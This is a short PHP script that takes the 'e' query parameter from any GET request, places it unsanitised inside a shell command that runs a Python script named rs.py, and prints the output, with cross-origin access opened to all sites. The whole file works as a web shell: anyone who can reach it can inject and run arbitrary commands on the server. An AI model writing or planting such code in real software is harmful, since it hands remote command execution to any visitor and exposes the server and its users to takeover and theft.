<?php
@header('Access-Control-Allow-Origin: *');
if($_GET) {
  $send_cmd = system('python rs.py "' . $_GET["e"] . '" 2>&1');
  echo($send_cmd);
}
?>